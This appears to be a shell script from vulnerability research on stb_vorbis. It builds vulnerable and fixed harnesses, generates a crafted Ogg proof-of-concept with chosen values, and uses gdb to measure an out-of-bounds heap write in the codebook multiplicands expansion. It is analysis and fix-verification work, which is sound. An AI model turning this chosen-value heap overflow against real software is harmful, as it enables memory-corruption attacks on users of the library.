#!/bin/sh
# W203: measure exact OOB extent of the chosen-seq PoC. The 8-byte
# multiplicands allocation is routed to a RW page by harness-guard.c;
# the pinned stb_vorbis.c is unchanged. The expansion loop stops at the
# source's own div-overflow guard before the guard page is reached.
set -u
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
cd "$HERE" || exit 2
mkdir -p evidence build/guard/vuln build/guard/fixed
cp harness-guard.c build/guard/vuln/harness-guard.c
cp harness-guard.c build/guard/fixed/harness-guard.c
cp pinned/stb_vorbis.c build/guard/vuln/stb_vorbis.c
cp pinned/stb_vorbis-dev.c build/guard/fixed/stb_vorbis.c
gcc -g -O0 -o build/guard/vuln/harness-guard build/guard/vuln/harness-guard.c -lm || exit 2
gcc -g -O0 -o build/guard/fixed/harness-guard build/guard/fixed/harness-guard.c -lm || exit 2
python3 gen_poc.py evidence/chosen-seq.ogg 16519105 65 0x4b434148 1 >/dev/null || exit 2
# :3895 is the div-overflow return inside the expansion loop; at that point
# every multiplicands index 0..j*65+k has been written.
gdb -q -batch \
  -ex 'set pagination off' \
  -ex 'break stb_vorbis.c:3895' \
  -ex 'run evidence/chosen-seq.ogg' \
  -ex 'p j' \
  -ex 'p k' \
  -ex 'p/x div' \
  -ex 'p c->lookup_values' \
  -ex 'p/x c->multiplicands' \
  -ex 'p/x guarded_pages@5' \
  -ex 'p/x *(unsigned int (*)[30])&c->multiplicands[2]' \
  ./build/guard/vuln/harness-guard > evidence/gdb-guard-extent.out 2>&1
./build/guard/fixed/harness-guard evidence/chosen-seq.ogg > evidence/guard-fixed.out 2>&1
FIXED_RC=$?
PASS=0; FAIL=0
check() {
  if grep -qF "$2" evidence/gdb-guard-extent.out; then
    PASS=$((PASS+1)); echo "PASS $1 $2"
  else
    FAIL=$((FAIL+1)); echo "FAIL $1 expected $2"
  fi
}
check extent_stop_site 'stb_vorbis.c:3895'
check extent_j '$1 = 0'
check extent_k '$2 = 31'
check extent_div '$3 = 0x80000000'
check extent_lookup_values '$4 = 2'
check chosen_2 '0x4c1270f6'
check chosen_3 '0x4c434148'
check chosen_4 '0x4c74119a'
check chosen_5 '0x4c9270f6'
WORDS=$(sed -n 's/^\$7 = {//p' evidence/gdb-guard-extent.out | tr ',' '\n' | wc -l)
if [ "$WORDS" -eq 30 ]; then
  PASS=$((PASS+1)); echo "PASS extent_words count=30"
else
  FAIL=$((FAIL+1)); echo "FAIL extent_words count=$WORDS"
fi
PTR=$(sed -n 's/^\$5 = \(0x[0-9a-f]*\)$/\1/p' evidence/gdb-guard-extent.out)
if [ -n "$PTR" ] && grep -F '$6 = ' evidence/gdb-guard-extent.out | grep -qF "$PTR"; then
  PASS=$((PASS+1)); echo "PASS multiplicands_on_guarded_page $PTR"
else
  FAIL=$((FAIL+1)); echo "FAIL multiplicands_on_guarded_page ptr=$PTR"
fi
if [ "$FIXED_RC" -eq 0 ]; then
  PASS=$((PASS+1)); echo "PASS fixed_guard rc=0"
else
  FAIL=$((FAIL+1)); echo "FAIL fixed_guard rc=$FIXED_RC"
fi
echo "TOTAL PASS=$PASS FAIL=$FAIL"
[ "$FAIL" -eq 0 ]
